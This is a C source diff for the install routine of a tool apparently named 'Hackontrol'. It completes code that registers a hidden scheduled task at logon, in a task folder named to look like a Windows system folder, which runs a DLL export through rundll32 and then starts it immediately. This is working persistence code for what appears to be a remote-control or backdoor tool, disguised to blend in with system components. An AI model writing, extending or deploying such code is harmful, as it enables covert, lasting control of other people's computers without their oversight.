@@ -1,9 +1,12 @@
 #include "definition.h"
 
 #define TASK_FOLDER_NAME L"Microsoft\\Windows\\Registry"
+#define RUNDLL32PATH L"System32\\rundll32.exe"
+
+#define TASK_NAME L"Startup"
+
 #define FILE_NAME L"libdll32.dll"
 #define FUNCTION_NAME L"Execute"
-#define RUNDLL32PATH L"System32\\rundll32.exe"
 
 EXPORT(Install) {
 	HRESULT result = CoInitializeEx(NULL, COINIT_MULTITHREADED);
@@ -289,12 +292,27 @@ EXPORT(Install) {
 		dialogError(result, L"ITaskSettings::put_Hidden");
 		goto releaseTaskSettings;
 	}
+	
+	taskFolder->lpVtbl->DeleteTask(taskFolder, TASK_NAME, 0);
+	IRegisteredTask* task = NULL;
+	result = taskFolder->lpVtbl->RegisterTaskDefinition(taskFolder, TASK_NAME, taskDefinition, TASK_CREATE_OR_UPDATE, emptyVariant, emptyVariant, TASK_LOGON_GROUP, emptyVariant, &task);
 
-	//HI_SetSettings(taskFolder, taskDefinition);
-	/*HI_RegisterTask(folder, definition, L"Startup");
-	definition->Release();
-	folder->Release();*/
-	MessageBoxW(NULL, L"Status: OK", L"Information", MB_OK | MB_DEFBUTTON1 | MB_ICONINFORMATION | MB_SYSTEMMODAL);
+	if(FAILED(result)) {
+		dialogError(result, L"ITaskFolder::RegisterTaskDefinition");
+		goto releaseTaskSettings;
+	}
+
+	MessageBoxW(NULL, L"Hackontrol successfully installed on your machine", L"Hackontrol Installer", MB_OK | MB_ICONINFORMATION | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
+	IRunningTask* runningTask = NULL;
+	result = task->lpVtbl->Run(task, emptyVariant, &runningTask);
+	task->lpVtbl->Release(task);
+
+	if(FAILED(result)) {
+		dialogError(result, L"IRegisteredTask::Run");
+		goto releaseTaskSettings;
+	}
+
+	runningTask->lpVtbl->Release(runningTask);
 releaseTaskSettings:
 	taskSettings->lpVtbl->Release(taskSettings);
 freeFunctionBuffer:
